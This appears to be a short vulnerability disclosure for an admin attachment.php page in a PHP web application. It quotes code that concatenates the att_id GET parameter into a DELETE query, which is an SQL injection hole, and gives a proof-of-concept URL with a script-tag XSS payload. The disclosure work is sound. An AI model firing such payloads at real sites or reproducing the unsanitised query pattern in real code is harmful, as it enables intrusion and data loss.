First of all, we can see that the attachment.php is loaded with a lot of functions in the admin directory, and we find that the del function specifies the variable act=del with a $_REQUEST function

![1](https://github.com/ysl1415926/cve/assets/138963581/9782bd47-91d3-44b8-aace-6740ffb7c20a)
![2](https://github.com/ysl1415926/cve/assets/138963581/de1ff1ab-497e-4216-aa35-a2af91daa13b)

` elseif($_REQUEST['act'] == 'del')
 {
 	$sql = "DELETE FROM ".table('attachment')." WHERE att_id = ".$_GET['att_id'];
 	if(!$db->query($sql)){
 		showmsg('删除附加属性出错', true);
 	}
 	showmsg('删除附加属性成功','attachment.php', true);
 }`

Then in the following code, you can see a SQL statement passing a att_id parameter in GET mode

![3](https://github.com/ysl1415926/cve/assets/138963581/7ba28355-00d6-412e-ac11-b03486d0a7c8)


`$sql = "DELETE FROM ".table('attachment')." WHERE att_id = ".$_GET['att_id'];`

At that time, it was supposed to be testing SQL injection, but he would print an error message on the next line

![4](https://github.com/ysl1415926/cve/assets/138963581/b4b79073-de8f-41d9-b42d-58bcf171f1cd)


This allows us to implement XSS attacks with faulty parameters

![5](https://github.com/ysl1415926/cve/assets/138963581/999237dd-4d5f-42aa-af8c-7220c232c3e0)


`if(!$db->query($sql)){
 		showmsg('删除附加属性出错', true);
 	}
 	showmsg('删除附加属性成功','attachment.php', true);`

The test was successful

poc：/admin/attachment.php?act=del&att_id=<script>alert(1)</script>

![6](https://github.com/ysl1415926/cve/assets/138963581/3283a4d5-8562-4db1-bedf-1b4989270033)
